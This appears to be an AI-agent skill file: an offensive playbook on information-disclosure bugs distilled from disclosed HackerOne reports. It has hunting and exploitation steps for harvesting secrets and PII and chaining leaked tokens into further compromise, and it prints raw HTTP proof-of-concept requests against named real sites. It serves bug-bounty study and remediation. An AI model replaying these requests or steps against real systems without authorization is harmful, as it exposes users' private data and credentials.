---
name: info-disclosure
description: "Information Disclosure offensive playbook from 434 disclosed HackerOne reports (32 critical, 53 high, 192 medium, 157 low). Use when hunting or reviewing information disclosure. Triggers: information, disclosure, sensitive, allowed, access."
license: "For authorized security testing and education only."
---

# Information Disclosure

> Distilled from **434** disclosed HackerOne reports. Real examples and the full
> report list are in [reference.md](reference.md).

## What it is

The app leaks data it shouldn't  -  secrets in responses, verbose errors/stack traces, debug endpoints, directory listing, timing, or metadata.

## Where to hunt

- Diff responses for extra fields, hit error paths, look for debug/status endpoints, source maps, `.git`, backups, and predictable file listings.

## Exploitation playbook

- Harvest secrets/PII from over-broad API responses and error messages.
- Use leaked internal IDs/paths/tokens to chain into IDOR/SSRF/auth bypass.

## Bypass techniques

- Trigger error conditions or alternate content types that expose more than the happy path.

## Impact & escalation

- Leaked credentials/tokens → direct account or infra compromise.

## Remediation

- Return only necessary fields, disable verbose errors/debug in prod, remove metadata, restrict listings and internal endpoints.

## Concrete payloads & PoCs

Extracted from disclosed writeups. Adapt to the target; test only where authorized.

### 1. [#2737309](https://hackerone.com/reports/2737309)  -  Information disclosure on password cancel endpoint
*low*

```http
POST /token.cgi HTTP/2
Host: bugzilla.mozilla.org
Cookie: _ga=GA1.2.943165794.1724831061; _ga_PWTK27XVWP=GS1.1.1724884053.2.0.1724884053.0.0.0; _ga_MQ…
Content-Type: application/x-www-form-urlencoded
Content-Length: 114
Origin: http://burpsuite
Referer: http://burpsuite/

cancel_token=1727251240-UxKc4U5ThgrHPhWNJ323-fahjy5Pn05h5ZYb7OqG-SI&t=3XOIDGIRtcwC3icniucOlm&a=cxlpw&cancel=Cancel
```

### 2. [#2737309](https://hackerone.com/reports/2737309)  -  Information disclosure on password cancel endpoint
*low*

```http
POST /token.cgi HTTP/2
Host: bugzilla.mozilla.org
Cookie: _ga=GA1.2.943165794.1724831061; _ga_PWTK27XVWP=GS1.1.1724884053.2.0.1724884053.0.0.0; _ga_MQ…
Content-Type: application/x-www-form-urlencoded
Content-Length: 114
Origin: http://burpsuite
Referer: http://burpsuite/
```

### 3. [#3403450](https://hackerone.com/reports/3403450)  -  Information Disclosure via Verbose Error Messages
*medium*

```http
POST /admin/channel-acl.php HTTP/1.1
Host: 192.168.109.200
Content-Type: application/x-www-form-urlencoded
Content-Length: 514
Origin: http://192.168.109.200
Referer: http://192.168.109.200/admin/channel-acl.php
Cookie: sessionID=<<sessions>>

token=3f62fcfd14d8336b06e12b5adb678962&type=deliveryLimitations%3AClient%3ABrowserVersion&affiliateid=7&channelid=4&acl%5B0%5D%5Blogical%5D=and&acl%5B0%5D%5Btype%5D=deliveryLimitations%3AClient%3ABrowserVersion&acl%5B0%5D%5Bexecutionorder%5D=0&acl%5B0%5D%5Bcomparison%5D=nn&acl%5B0%5D%5Bdata%5D%5B%5D=Firefox&acl%5B1%5D%5Blogical%5D=and&acl%5B1%5D%5Btype%5D=deliveryLimitations%3AClient%3ALanguage&acl%5B1%5D%5Bexecutionorder%5D=1&acl%5B1%5D%5Bcomparison%5D=%3D%7E&acl%5B1%5D%5Bdata%5D%5B%5D=ar&submit=Save+Changes
```

### 4. [#3003716](https://hackerone.com/reports/3003716)  -  User Email Disclosure via ID-Based Invitation
*medium*

```http
POST /api/v1/users/current/orgs/59a5809f-2ba1-43de-b6d7-3ca104b79d80/people.bulk HTTP/2
Host: wakatime.com
Cookie: 
Referer: https://wakatime.com/settings/orgs/59a5809f-2ba1-43de-b6d7-3ca104b79d80/people
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 58
Origin: https://wakatime.com

{"people":[{"id":"<victim_id>"}]}
```

### 5. [#2201370](https://hackerone.com/reports/2201370)  -  Information disclosure via enabled Django Debug Mode
*medium*

```http
POST /api/auth/register/ HTTP/1.1
Host: backend.webreg.mtn.zm
Cookie: ███████
Referer: ████████
X-Requested-With: XMLHttpRequest
Content-Length: 80
Origin: ██████████: 1

{
"email": "██████████",
"password": "password██████████"
}
```

### 6. [#2201370](https://hackerone.com/reports/2201370)  -  Information disclosure via enabled Django Debug Mode
*medium*

```http
POST /api/auth/register/ HTTP/1.1
Host: backend.webreg.mtn.zm
Cookie: ███████
Referer: ████████
X-Requested-With: XMLHttpRequest
Content-Length: 80
Origin: ██████████: 1
```

More payloads: see [payloads.md](payloads.md) (253 curated).

## Recurring patterns in this dataset

Most frequent terms across the 434 reports (term (count)): `information` (217), `disclosure` (161), `sensitive` (95), `allowed` (85), `access` (83), `email` (77), `private` (70), `file` (58), `through` (58), `api` (57), `program` (54), `attacker` (49), `exposed` (49), `endpoint` (47), `disclosed` (42), `server` (41), `data` (40), `leak` (38)

## Worked example  -  [report #509924](https://hackerone.com/reports/509924)

*JSON serialization of any Project model results in all Runner tokens being exposed through Quick Actions* (critical, $12,000)

> The Quick Actions interpreter allows an attacker to reference a Project it does not have access to. The model attributes are then being serialized and returned to the user, which results in the Runner token (both encrypted and unencrypted) being returned to the user. This vulnerability is currently exploitable on GitLab.com. Proof of concept The vulnerability is relatively straightforward to reproduce. 1. Create a project 1. Create an issue 1. Write /move <full path of any other project and click "Comment", a request to /:namespace/:project/notes is submitted 1. Observe the JSON response that is being returned, which contains the serialized Project model: Impact This vulnerability gives any…

## Top disclosed examples

| Report | Severity | Bounty | Program | Title |
| :-- | :-- | :-- | :-- | :-- |
| [#509924](https://hackerone.com/reports/509924) | critical | $12,000 | gitlab | JSON serialization of any Project model results in all Runner tokens being exposed thro… |
| [#850447](https://hackerone.com/reports/850447) | critical | $10,000 | gitlab | gitlab-workhorse bypass in Gitlab::Middleware::Multipart allowing files in `allowed_pat… |
| [#671935](https://hackerone.com/reports/671935) | critical | $4,000 | slack | SSRF via Office file thumbnails |
| [#1225164](https://hackerone.com/reports/1225164) | critical | $560 | x | Identify the mobile number of a twitter user |
| [#489146](https://hackerone.com/reports/489146) | critical |  -  | security | Confidential data of users and limited metadata of programs and reports accessible via … |
| [#3000510](https://hackerone.com/reports/3000510) | critical |  -  | security | The /reports/:id.json endpoint discloses potentially sensitive user attributes when rep… |
| [#769016](https://hackerone.com/reports/769016) | critical |  -  | starbucks | sdrc.starbucks.com - Information Disclosure via unsecured attachment directory |
| [#1069335](https://hackerone.com/reports/1069335) | critical |  -  | h1-ctf | How The Hackers Saved Christmas |

*See [reference.md](reference.md) for all 434 reports in this class.*
